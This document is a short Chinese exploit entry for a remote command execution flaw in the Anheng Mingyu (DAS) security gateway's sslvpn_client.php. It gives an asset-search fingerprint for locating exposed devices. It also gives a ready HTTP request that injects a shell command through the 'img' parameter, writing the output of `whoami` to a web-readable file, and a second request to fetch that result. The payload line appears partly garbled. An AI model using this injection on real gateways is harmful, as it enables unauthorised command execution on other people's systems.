# 安恒明御安全网关sslvpn_client存在远程命令执行漏洞

- **系统**：安恒明御安全网关　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="安恒明御安全网关"`
- **请求**：`GET /sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmpecho%20%60whoami%60%20tee%20/usr/local/webui/sslvpn/ceshi.txtls HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`

**请求体 / payload**
```

获取命令执行结果
GET /sslvpn/ceshi.txt HTTP/1.1
Host: xx.xx.xx.xx
```

**其他**
- 安恒明御安全网关sslvpn\_client存在远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 安恒明御安全网关